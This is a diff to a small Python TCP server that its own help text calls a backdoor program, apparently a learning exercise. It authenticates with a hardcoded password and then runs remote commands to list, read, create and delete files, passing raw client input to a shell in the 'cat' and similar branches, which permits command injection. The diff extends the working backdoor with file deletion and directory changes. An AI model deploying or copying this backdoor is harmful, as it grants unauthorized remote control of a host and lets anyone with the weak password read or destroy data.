@@ -2,35 +2,39 @@
 
 import socketserver
 import subprocess
+import os
 
 PASSWORD_PROMPT = 'Password for user: '
-AUTHENTICATE_SUCCESS = 'Login success'
-AUTHENTICATE_FAIL = 'Login fail'
+AUTHENTICATE_SUCCESS = 'Login success\n'
+AUTHENTICATE_FAIL = 'Login fail\n'
 INVALID_COMMAND = 'Command could not be executed: '
 PROMPT_COMMAND = 'indra@localhost > '
 OFF = 'Have a great day!'
-OK = 'OK'
+OK = 'OK\n'
 
 class TCPHandler(socketserver.BaseRequestHandler):
     BUFFER_SIZE = 4096
-    PASSWORD = 'test'
+    PASSWORD = 'password'
 
     def handle(self):
         # Authenticate the user
-        self.authenticate()
-        while True:
-            self.send(PROMPT_COMMAND)
-            command = self.receive()
-            output = self.execute_command(command)
-            print("client {} wrote: ".format(self.client_address[0]) + command)
-            print(output)
-            if output == 'invalid':
-                self.send_nl(INVALID_COMMAND + command)
-            elif output == 'off':
-                self.send_nl(OFF)
-                break;
-            else:
-                self.send_nl(output)
+        try:
+            self.authenticate()
+            while True:
+                self.send(PROMPT_COMMAND)
+                command = self.receive()
+                print("{} wrote: ".format(self.client_address[0]) + command)
+                output = self.execute_command(command)
+                print(output)
+                if output == 'invalid':
+                    self.send_nl(INVALID_COMMAND + command + '\n')
+                elif output == 'off':
+                    self.send_nl(OFF)
+                    break
+                else:
+                    self.send_nl(output)
+        except IOError as e:
+            print("Error occured {}".format(str(e)))
 
     def receive(self):
         msg = self.request.recv(1024).decode('utf-8').rstrip('\n')
@@ -56,24 +60,23 @@ class TCPHandler(socketserver.BaseRequestHandler):
     def execute_command(self, command):
         try:
             if command == "help":
-                output = 'pwd        : returns working director\n' \
-                    'cd <dir>   : changes working directory to <dir>\n' \
-                    'ls         : lists the contents of working directory\n' \
-                    'cat <file> : returns contents of the file\n' \
-                    'help       : prints a list of commands\n' \
-                    'off        : terminates the backdoor program'
-            elif command == "ls":
-                # subprocess.call(["ls", "-l"])
-                output = subprocess.check_output(["ls", "-l"])
+                output = 'pwd          : returns working director\n' \
+                    'cd <dir>     : changes working directory to <dir>\n' \
+                    'ls           : lists the contents of working directory\n' \
+                    'cat <file>   : returns contents of the file\n' \
+                    'ps           : show currently running processes\n' \
+                    'rm <file>    : delete a file named <file>\n' \
+                    'touch <file> : create a file named <file>\n' \
+                    'help         : prints a list of commands\n' \
+                    'off          : terminates the backdoor program\n'
             elif command == "pwd":
-                # subprocess.call(["ls", "-l"])
                 output = subprocess.check_output(["pwd"])
-            #TODO cd
+            elif command == "ls":
+                output = subprocess.check_output(["ls", "-l"])
             elif "cd" in command:
-                print(command)
-                subprocess.call("cd /", shell=True, cwd="/")
+                sp = command.split()
+                output = os.chdir(sp[1])
                 output = OK
-                # output = subprocess.check_output("cd /", shell=True, cwd="/")
             elif "cat" in command:
                 output = subprocess.check_output(command, shell=True)
             elif "ps" in command:
@@ -88,7 +91,11 @@ class TCPHandler(socketserver.BaseRequestHandler):
                 output = 'off'
             else:
                 output = "invalid"
-        except subprocess.CalledProcessError:
+        except subprocess.CalledProcessError as e:
+            print("Error occured {}".format(str(e)))
+            output = "invalid"
+        except OSError as e:
+            print("Error occured {}".format(str(e)))
             output = "invalid"
 
         if isinstance(output, bytes):
@@ -97,6 +104,6 @@ class TCPHandler(socketserver.BaseRequestHandler):
             return output
 
 if __name__ == "__main__":
-    HOST, PORT = "localhost", 9999
+    HOST, PORT = "localhost", 9990
     server = socketserver.TCPServer((HOST, PORT), TCPHandler)
     server.serve_forever()
